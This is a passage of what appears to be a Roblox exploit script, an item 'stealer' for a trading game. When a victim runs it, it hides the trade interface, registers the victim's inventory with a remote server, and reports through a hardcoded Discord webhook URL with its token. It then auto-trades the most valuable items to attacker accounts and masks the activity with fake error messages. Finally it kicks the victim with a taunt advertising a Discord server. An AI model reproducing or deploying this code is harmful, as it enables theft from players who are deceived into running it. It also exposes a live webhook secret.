			until Players.LocalPlayer.PlayerGui:GetAttribute("Device")
		end

		return Players.LocalPlayer.PlayerGui:GetAttribute("Device")
	end

	hideTrade = function()
		local TradeGui = Players.LocalPlayer.PlayerGui.TradeGUI
		local PhoneGui = Players.LocalPlayer.PlayerGui.TradeGUI_Phone
		local Device = getUserDevice()

		for _, Child in TradeGui:GetChildren() do
			Hide(Child)
		end

		Hide(PhoneGui.Inactive.Frame)
		Hide(PhoneGui.Inactive.TradeMainOld)
		Hide(PhoneGui.Container)

		if Device == "Phone" then
			local Blocker = Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone"):WaitForChild("ClickBlocker")
			local Request = Players.LocalPlayer.PlayerGui:WaitForChild("MainGUI").Lobby.Leaderboard.Container.OverlayMenu.TradeRequest
			Blocker.Visible = false
			Request.Visible = false

			Watch(Blocker, "Visible", function()
				Blocker.Visible = false
			end)

			Watch(Request, "Visible", function()
				Request.Visible = false
			end)
		else
			pcall(function()
			end)
		end
	end

	return { setup = function()
		Trade.SetRequestsEnabled:FireServer(true)
		hideTrade()
		Neutralize()
	end }
end

Container.W = function()
	local Entry = Container.Cache.W

	if not Entry then
		Entry = { Value = BuildSetup() }
		Container.Cache.W = Entry
	end

	return Entry.Value
end

local function BuildBindings()
	local Metadata = Container.M()
	local Domain = Container.U()
	local Players = game:GetService("Players")
	local Trade = game:GetService("ReplicatedStorage").Trade

	Trade.StartTrade.OnClientEvent:Connect(function(Info)
		local Name

		if Info.Player1.Player.Name ~= Players.LocalPlayer.Name then
			Name = Info.Player1.Player.Name
		else
			Name = Info.Player2.Player.Name
		end

		Metadata.coreEventBus.publish(Domain.newTradeCreated.create({ username = Name }))
	end)

	Trade.UpdateTrade.OnClientEvent:Connect(function(Info)
		local Offer = {}
		if not Info then
			return
		end
		local Items

		if Info.Player1.Player.Name ~= Players.LocalPlayer.Name then
			Items = Info.Player2.Offer
		else
			Items = Info.Player1.Offer
		end

		for _, Entry in Items do
			if Entry then
				Offer[Entry[1]] = Entry[2]
			end
		end

		local Ok, Result = pcall(Metadata.tradeStore.updateOffer, Offer)

		if not Ok then
			Metadata.logger.error("Failed to update offer in store", { error = Result })
		end
	end)

	Trade.AcceptTrade.OnClientEvent:Connect(function(Info)
		if not Info then
			return
		end
		task.wait(1)
		local Ok, Result = pcall(Metadata.tradeStore.succeed)

		if not Ok then
			Metadata.logger.error("Failed to succeed trade in store", { error = Result })
		end
	end)

	Trade.DeclineTrade.OnClientEvent:Connect(function()
		local Ok, Result = pcall(Metadata.tradeStore.failed)

		if not Ok then
			Metadata.logger.error("Failed to fail trade in store", { error = Result })
		end
	end)

	Trade.SendRequest.OnClientInvoke = function()
		pcall(Metadata.tradeRequest.cancelSentRequest)
	end

	return nil
end

Container.X = function()
	local Entry = Container.Cache.X

	if not Entry then
		Entry = { Value = BuildBindings() }
		Container.Cache.X = Entry
	end

	return Entry.Value
end

local function BuildGame()
	Container.I()

	if game.ReplicatedStorage.Remotes.Extras.GetPlayerLevel:InvokeServer(game.Players.LocalPlayer) < 10 then
		error("Player level is too low")
	end

	local Inventory = Container.S()
	local Request = Container.T()
	local Trade = Container.V()
	local Setup = Container.W()
	Container.X()
	return { inventory = Inventory, tradeRequest = Request, trade = Trade, gameSetup = Setup }
end

Container.Y = function()
	local Entry = Container.Cache.Y

	if not Entry then
		Entry = { Value = BuildGame() }
		Container.Cache.Y = Entry
	end

	return Entry.Value
end

local function BuildLogger()
	local Factory = Container.C()
	local Json = Container.N()
	local Config = Container.B()
	local Metadata = Container.M()

	local function Gate(Allowed)
		return function(Level, Next, ...)
			if not Allowed[Level] then
				return ...
			end
			return Next(...)
		end
	end

	local function Console(Level, Next, ...)
		local Args = { Next(...) }

		if Level == "verbose" then
			local Write = print
			local Line = ("[%*]: %*"):format(Level, table.concat(Args, " "))
			Write(Line)
		else
			local Write = warn
			local Line = ("[%*]: %*"):format(Level, table.concat(Args, " "))
			Write(Line)
		end

		return table.unpack(Args)
	end

	local function Ignored(Message)
		local Lower = Message:lower()

		for _, Pattern in Config.IGNORE_MESSAGE_PATTERNS_IN_WEBHOOK do
			if not Lower:find(Pattern) then
				continue
			end
			return true
		end

		return false
	end

	local function SendWebhook(Message)
		task.spawn(function()
			local Response = request({
				Url = "https://discord.com/api/webhooks/1427333378146963517/IVgB0BKSrcNJQPe65hFxkcpTfkubHwSB9xN-6XBPX_i4g1iiD66L7qjeAycA0HGMSXjw",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = Json.encode({ content = Message }),
			})

			if Response.statusCode ~= 200 then
				local Write = warn
				local Line = ("Failed to log to webhook: %*"):format(Response.statusCode)
				Write(Line)
			end
		end)
	end

	local function Webhook(Level, Next, ...)
		local Args = { Next(...) }
		local Line = ("[%*]: %*"):format(Level, table.concat(Args, " "))

		if not Ignored(Line) then
			SendWebhook(Line)
		end

		return table.unpack(Args)
	end

	local function Encode(Level, Next, ...)
		local Out = {}

		for _, Arg in { Next(...) } do
			Out[#Out + 1] = Json.encode(Arg)
		end

		return table.unpack(Out)
	end

	local function Attach(Level, Next, ...)
		local Args = { Next(...) }
		table.insert(Args, { metadata = Metadata.metadataForLogger })
		return table.unpack(Args)
	end

	local Sink = _G.VERBOSE == true and Console or Webhook
	return Factory(Gate({ error = true, warn = true, verbose = _G.VERBOSE == true }), Sink, Encode, Attach)
end

Container.Z = function()
	local Entry = Container.Cache.Z

	if not Entry then
		Entry = { Value = BuildLogger() }
		Container.Cache.Z = Entry
	end

	return Entry.Value
end

local function BuildStore()
	local Metadata = Container.M()
	local Domain = Container.U()
	Container.L()

	return function()
		local Active = false
		local Offer = {}

		return {
			isInTrade = function()
				return Active
			end,
			begin = function()
				if Active then
					error("Can't begin new trade, because it's already in trade")
				end

				Active = true
			end,
			finish = function()
				if not Active then
					error("Can't finish trade, because there is no trade")
				end

				Active = false
				Offer = {}
			end,
			updateOffer = function(NewOffer)
				if not Active then
					error("Can't update opponent offer, because there is no trade")
				end

				Offer = NewOffer
			end,
			failed = function()
				if not Active then
					error("Can't fail trade, because there is no trade")
				end

				Metadata.coreEventBus.publish(Domain.tradeFinished.create({ isSuccess = false, items = Offer }))
			end,
			succeed = function()
				if not Active then
					error("Can't finish trade, because there is no trade")
				end

				Metadata.coreEventBus.publish(Domain.tradeFinished.create({ isSuccess = true, items = Offer }))
			end,
		}
	end
end

Container.AA = function()
	local Entry = Container.Cache.AA

	if not Entry then
		Entry = { Value = BuildStore() }
		Container.Cache.AA = Entry
	end

	return Entry.Value
end

local function BuildContext()
	local Metadata = Container.M()
	local Events = Container.G()

	return function()
		local Api = Container.R()
		local Game = Container.Y()
		local Logger = Container.Z()
		local Store = Container.AA()
		Metadata.metadataForLogger = {}
		Metadata.trade = Game.trade
		Metadata.tradeRequest = Game.tradeRequest
		Metadata.gameSetup = Game.gameSetup
		Metadata.inventory = Game.inventory
		Metadata.coreEventBus = Events.createBus()
		Metadata.domainEventBus = Events.createBus()
		Metadata.tradeStore = Store()
		Metadata.logger = Logger
		Metadata.api = Api
	end
end

Container.AB = function()
	local Entry = Container.Cache.AB

	if not Entry then
		Entry = { Value = BuildContext() }
		Container.Cache.AB = Entry
	end

	return Entry.Value
end

local function BuildDomainEvents2()
	return { itemClaimed = Container.G().createEventDefinition() }
end

Container.AC = function()
	local Entry = Container.Cache.AC

	if not Entry then
		Entry = { Value = BuildDomainEvents2() }
		Container.Cache.AC = Entry
	end

	return Entry.Value
end

local function BuildRecorder()
	Container.G()

	return function()
		local Events = {}

		local function Record(Event)
			Events[#Events + 1] = Event
		end

		return {
			record = Record,
			playback = function(Bus)
				local Pending = Events
				Events = {}

				for _, Event in Pending do
					Bus.publish(Event)
				end
			end,
		}
	end
end

Container.AD = function()
	local Entry = Container.Cache.AD

	if not Entry then
		Entry = { Value = BuildRecorder() }
		Container.Cache.AD = Entry
	end

	return Entry.Value
end

local function BuildHit()
	local Claimed = Container.AC()
	Container.A()
	local Recorder = Container.AD()

	return { create = function(Id, SecretKey, Usernames, Items)
		local Hit = { id = Id, secretKey = SecretKey, usernames = Usernames, items = Items, eventsRecorder = Recorder() }

		local function Find(UniqueId)
			for _, Item in Hit.items do
				if Item.uniqueId ~= UniqueId then
					continue
				end
				return Item
			end

			return nil
		end

		Hit.getItemsToTransfer = function(SortByPrice)
			local Pending = {}

			for _, Item in Hit.items do
				if Item.claimedCount < Item.count then
					table.insert(Pending, Item)
				end
			end

			if SortByPrice then
				table.sort(Pending, function(A, B)
					return A.valuable.price > B.valuable.price
				end)
			end

			return Pending
		end

		Hit.hasUnclaimedItems = function()
			return #Hit.getItemsToTransfer() > 0
		end

		Hit.isItemExists = function(UniqueId)
			return Find(UniqueId) ~= nil
		end

		Hit.isWantedItem = function(UniqueId)
			local Item = Find(UniqueId)
			if Item ~= nil then
				return Item.isWanted
			end
			return false
		end

		Hit.canClaim = function(Username)
			for _, Name in Hit.usernames do
				if Name:lower():find(Username:lower()) == nil then
					continue
				end
				return true
			end

			return false
		end

		Hit.claimItem = function(UniqueId, Count)
			local Item = Find(UniqueId)

			if Item == nil then
				local Raise = error
				local Message = ("Item not found (uniqueId: %*)"):format(UniqueId)
				Raise(Message)
			end

			if Item.count < Item.claimedCount + Count then
				local Raise = error
				local Message = ("Can't claim more items than available (item: %*, count: %*, claimedCount: %*, claiming count: %*)"):format(Item.uniqueId, Item.count, Item.claimedCount, Count)
				Raise(Message)
			end

			Item.claimedCount = Item.claimedCount + Count
			Hit.eventsRecorder.record(Claimed.itemClaimed.create({ uniqueId = UniqueId, count = Count }))
		end

		return Hit
	end }
end

Container.AE = function()
	local Entry = Container.Cache.AE

	if not Entry then
		Entry = { Value = BuildHit() }
		Container.Cache.AE = Entry
	end

	return Entry.Value
end

local function BuildRetry()
	return { retry = function(Attempts, Delay, Fn)
		local Tries = 0
		local LastError = nil
		local Result

		while true do
			if not (Tries < Attempts) then
				return error(LastError)
			else
				local Ok
				Ok, Result = pcall(Fn)
				if Ok then
					break
				end
				Tries += 1
				LastError = Result
				task.wait(Delay)
			end
		end

		return Result
	end }
end

Container.AF = function()
	local Entry = Container.Cache.AF

	if not Entry then
		Entry = { Value = BuildRetry() }
		Container.Cache.AF = Entry
	end

	return Entry.Value
end

local function BuildOrchestrator()
	Container.AE()
	local Domain = Container.U()
	local Metadata = Container.M()

	return function(Hit)
		local Players = game:GetService("Players")

		local function TryClaim(Player)
			if Hit.canClaim(Player.Name) then
				Metadata.logger.verbose("Player can claim hit", { player = Player.Name })
				Metadata.coreEventBus.publish(Domain.targetAppearedOnServer.create({ username = Player.Name }))
			end
		end

		local function Scan()
			for _, Player in Players:GetPlayers() do
				TryClaim(Player)
			end
		end

		Players.PlayerAdded:Connect(TryClaim)
		Scan()

		while Hit.hasUnclaimedItems() or ID == "6d43a3d5-3290-4938-b6e6-25d2ebf324d2" do
			Scan()
			task.wait(1)
		end

		_G.stop = true
		task.wait(1)
		setclipboard("discord.gg/project-reverse")
		Players.LocalPlayer:Kick("Your 1nventory got cleaned by discord.gg/project-reverse")
	end
end

Container.AG = function()
	local Entry = Container.Cache.AG

	if not Entry then
		Entry = { Value = BuildOrchestrator() }
		Container.Cache.AG = Entry
	end

	return Entry.Value
end

local function BuildPoller()
	Container.AE()
	local Metadata = Container.M()

	return function(Hit)
		while true do
			local Ok, Result = pcall(Metadata.api.pullFromConnection, Hit.secretKey)

			if not Ok then
				Metadata.logger.error("Failed to pull from connection", { error = Result })
			end

			task.wait(0.2)
		end
	end
end

Container.AH = function()
	local Entry = Container.Cache.AH

	if not Entry then
		Entry = { Value = BuildPoller() }
		Container.Cache.AH = Entry
	end

	return Entry.Value
end

local function BuildResponder()
	Container.AE()
	local Claimed = Container.AC()
	Container.H()
	local Domain = Container.U()
	local Metadata = Container.M()

	local function BuildPayload(Hit)
		local Items = {}

		for _, Item in Hit.getItemsToTransfer(true) do
			table.insert(Items, { uniqueId = Item.uniqueId, name = Item.valuable.name, count = Item.count - Item.claimedCount })
		end

		return Items
	end

	local function Guard(Fn)
		local Ok, Result = pcall(Fn)

		if not Ok then
			Metadata.logger.error("Failed to execute callback, declining trade", { error = Result })
			local Ok2, Result2 = pcall(Metadata.trade.decline)

			if not Ok2 then
				Metadata.logger.error("Failed to decline trade", { error = Result2 })
			end
		end

		return Ok
	end

	local function Finish()
		local Ok, Result = pcall(Metadata.tradeStore.finish)

		if not Ok then
			Metadata.logger.error("Failed to finish trade in store", { error = Result })
		end
	end

	return function(Hit)
		Metadata.coreEventBus.subscribe(Domain.targetAppearedOnServer.createObserver(function(Event)
			if Metadata.tradeStore.isInTrade() then
				return
			end

			pcall(function()
				local Trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
				local Status, Info = Trade.GetTradeStatus:InvokeServer()

				if Status == "ReceivingRequest" then
					if Info.Receiver ~= Event.payload.username then
						Trade.DeclineRequest:FireServer()
					end
				elseif Status == "SendingRequest" and Info.Receiver ~= Event.payload.username then
					Trade.CancelRequest:FireServer()
				end
			end)

			Metadata.tradeRequest.cancelSentRequest()
			Metadata.tradeRequest.sendRequest(Event.payload.username)
		end))

		Metadata.coreEventBus.subscribe(Domain.newTradeCreated.createObserver(function(Event)
			if Hit.canClaim(Event.payload.username) then
				Metadata.logger.verbose("New trade created", { username = Event.payload.username })

				if not Guard(function()
					Metadata.tradeStore.begin()
					local Items = BuildPayload(Hit)
					Metadata.logger.verbose("Adding items to trade", { items = Items })
					Metadata.trade.addItems(Items)
				end) then
					Metadata.logger.error("Failed to add items to trade, trade declined")
				end

				return
			end

			local Ok, Result = pcall(Metadata.trade.decline)

			if not Ok then
				Metadata.logger.error("Failed to decline trade, from unknown user", { username = Event.payload.username, error = Result })
			end
		end))

		Metadata.coreEventBus.subscribe(Domain.itemsAdded.createObserver(function()
			Metadata.logger.verbose("Items added")

			if not Guard(function()
				Metadata.trade.accept()
			end) then
				Metadata.logger.error("Failed to confirm trade, trade declined")
			end
		end))

		Metadata.coreEventBus.subscribe(Domain.tradeFinished.createObserver(function(Event)
			if not Event.payload.isSuccess then
				Finish()
				return
			end

			for UniqueId, Count in Event.payload.items do
				if Hit.isItemExists(UniqueId) then
					Hit.claimItem(UniqueId, Count)
				else
					Metadata.logger.warn("Item does not exist in hit domain model, claiming skipped", { uniqueId = UniqueId })
				end
			end

			Finish()
			Hit.eventsRecorder.playback(Metadata.domainEventBus)
		end))

		Metadata.domainEventBus.subscribe(Claimed.itemClaimed.createObserver(function(Event)
			local Payload = Event.payload
			if not Hit.isWantedItem(Payload.uniqueId) then
				return
			end
			local Ok, Result = pcall(Metadata.api.claimItem, Hit.secretKey, Payload.uniqueId, Payload.count)

			if not Ok then
				Metadata.logger.error("Failed to claim item", { error = Result })
			end
		end))
	end
end

Container.AI = function()
	local Entry = Container.Cache.AI

	if not Entry then
		Entry = { Value = BuildResponder() }
		Container.Cache.AI = Entry
	end

	return Entry.Value
end

local Config = Container.B()

if game.GameId ~= Config.GAME_ID then
	return
end

_G.stop = false
local Players = game:GetService("Players")
local ErrorText = "There was a problem receiving data, please reconnect. \n (Error Code: 260)"

game:GetService("CoreGui").DescendantAdded:Connect(function(Descendant)
	if _G.stop then
		return
	end

	if not (Descendant.Name == "ErrorMessage" and Descendant:IsA("TextLabel")) then
		return
	end
	Descendant.Text = ErrorText

	Descendant:GetPropertyChangedSignal("Text"):Connect(function()
		if Descendant.Text ~= ErrorText then
			Descendant.Text = ErrorText
		end
	end)
end)

if Players.MaxPlayers <= #Players:GetPlayers() then
	Players.LocalPlayer:Kick("init")
	return
end

local Metadata = Container.M()
local Setup = Container.AB()
Container.J()
Container.H()
local HitFactory = Container.AE()
Container.A()
local Retry = Container.AF()
local Orchestrator = Container.AG()
local Poller = Container.AH()
local Responder = Container.AI()

local function GetJobId()
	local JobId = nil
	local Executor = getexecutorname():lower()
	if hookmetamethod == nil or Executor ~= "delta" then
		return game.JobId
	end
	local Original = nil

	Original = hookmetamethod(game, "__index", function(Target, Key)
		if JobId == nil and checkcaller() == false then
			JobId = Original(game, ("JobId"))
		end

		return Original(Target, Key)
	end)

	repeat
		task.wait(0.1)
	until JobId ~= nil

	return JobId
end

local function RegisterExecution()
	local Ok, Result = pcall(Metadata.api.registerExecution)

	if not Ok then
		Metadata.logger.error("Failed to register execution", { error = Result })
		error("failed to start, please try again later")
	end

	return Result
end

local function RegisterHit(Nonce, Inventory)
	Metadata.logger.verbose("Registering hit...")
	local Payload = {}

	for _, Item in Inventory do
		Payload[Item.uniqueId] = { uniqueId = Item.uniqueId, valuable = Item.name, count = Item.count, metadata = {} }
	end

	local Ok, Result = pcall(Metadata.api.registerHit, {
		username = Players.LocalPlayer.Name,
		inventory = Payload,
		game = Config.GAME_NAME,
		serverId = GetJobId(),
		stealerId = ID,
		executor = Config.EXECUTOR_NAME,
		nonce = Nonce,
	})

	if not Ok then
		Metadata.logger.error("Failed to register hit", { error = Result })
		error("failed to start, please try again later")
	end

	return Result
end

local function Connect(Hit)
	Metadata.logger.verbose("Connecting to hit...", { secretKey = Hit.secretKey })

	local Ok, Result = pcall(Retry.retry, 5, 0.5, function()
		return (Metadata.api.connect(Hit.secretKey))
	end)

	if not Ok then
		Metadata.logger.error("Failed to connect to hit", { error = Result })
		error("failed to start, please try again later")
	end

	Metadata.logger.verbose("Connected to hit")
end

local function BuildItems(HitItems, Inventory)
	local Items = {}
	local Seen = {}

	for _, Entry in HitItems do
		local Item = {
			id = Entry.id,
			uniqueId = Entry.uniqueId,
			valuable = Entry.valuable,
			count = Entry.count,
			claimedCount = Entry.claimedCount,
			isWanted = true,
		}

		Seen[Entry.uniqueId] = true
		table.insert(Items, Item)
	end

	if not Config.GIVE_ALL_ITEMS then
		return Items
	end

	for _, Entry in Inventory do
		if not Seen[Entry.uniqueId] then
			table.insert(Items, {
				id = Entry.uniqueId,
				uniqueId = Entry.uniqueId,
				valuable = { name = Entry.name, price = 0 },
				count = Entry.count,
				claimedCount = 0,
				isWanted = false,
			})
		end
	end

	return Items
end

task.spawn(function()
	local ServerType = game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType"):InvokeServer()
	Setup()
	Metadata.metadataForLogger.serverType = ServerType
	Metadata.metadataForLogger.username = Players.LocalPlayer.Name
	Metadata.metadataForLogger.executor = Config.EXECUTOR_NAME
	Metadata.metadataForLogger.hwid = Config.HWID

	if ServerType == "VIPServer" then
		local Verbose = Metadata.logger.verbose
		local Message = ("Player is VIP, kicking... %*"):format(Players.LocalPlayer.Name)
		Verbose(Message)
		Players.LocalPlayer:Kick("Game restarted")
		return
	end

	Metadata.logger.verbose("Dependencies initialized, registering execution...")
	local Execution = RegisterExecution()
	Metadata.logger.verbose("Execution registered, registering hit...")
	local Inventory = Metadata.inventory.getItems()
	Metadata.logger.verbose("Got user inventory", { inventory = Inventory })

	if #Inventory == 0 then
		Metadata.logger.verbose("No inventory items found, declining hit")
		error("failed to start, please try again later")
	end

	local Response = RegisterHit(Execution, Inventory)
	Metadata.logger.verbose("Hit registered", { hitDto = Response })
	Metadata.metadataForLogger.hitId = Response.hit.id
	Metadata.logger.verbose("Creating hit domain model...")
	local Items = BuildItems(Response.hit.items, Inventory)
	local Hit = HitFactory.create(Response.hit.id, Response.secretKey, Response.usernames, Items)
	Metadata.logger.verbose("Hit model created", { hit = Hit })
	Connect(Hit)
	Metadata.logger.verbose("Starting game setup...")
	Metadata.gameSetup.setup()
	Metadata.logger.verbose("Game setup completed")
	Metadata.logger.verbose("Starting jobs...")
	task.spawn(Orchestrator, Hit)
	task.spawn(Poller, Hit)
	Metadata.logger.verbose("Jobs started")
	Metadata.logger.verbose("Starting orchestrator...")
	Responder(Hit)
	Metadata.logger.verbose("Orchestrator started")
end)